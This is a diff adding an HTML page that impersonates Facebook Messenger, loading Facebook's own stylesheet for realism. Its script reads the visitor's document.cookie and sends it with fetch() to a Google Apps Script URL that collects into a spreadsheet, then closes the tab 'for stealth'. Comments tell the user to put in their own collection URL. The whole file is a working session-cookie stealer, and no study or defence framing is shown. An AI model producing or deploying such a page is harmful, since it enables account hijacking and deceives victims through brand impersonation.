@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Messenger</title>
+<!-- Load Facebook's actual CSS for a realistic look -->
+<link rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yG/r/7x9y8g0y9q_.css">
+<style>
+  body {
+    background-color: #f0f2f5;
+    font-family: Helvetica, Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+  .box {
+    background: white;
+    padding: 20px;
+    border-radius: 8px;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    text-align: center;
+    width: 300px;
+  }
+  .logo {
+    font-size: 40px;
+    color: #0084ff; /* Messenger Blue */
+    margin-bottom: 10px;
+    font-weight: bold;
+  }
+  p {
+    color: #65676b;
+    font-size: 14px;
+  }
+</style>
+</head>
+<body>
+
+<div class="box">
+  <div class="logo">M</div>
+  <p>Capturing your session...</p>
+</div>
+
+<script>
+  function sendCookie(c) {
+    // REPLACE THIS URL WITH YOUR GOOGLE SCRIPT URL
+    var url = "https://script.google.com/macros/s/AKfycbyfvoYAT8gpfsKnkf4SrY-PxUUmg-mylC7L_CTFuOovbFGzNHi-sE_8h8g3WMn1Z8w/exec"; 
+    
+    // Send the cookie to Google Sheets
+    fetch(url + "?cookie=" + c, { method: "GET" });
+    
+    // Close the window/tab after 1.5 seconds for stealth
+    setTimeout(function(){ 
+      window.close(); 
+    }, 1500);
+  }
+
+  // Get current cookie and send it
+  sendCookie(document.cookie);
+</script>
+
+</body>
+</html>
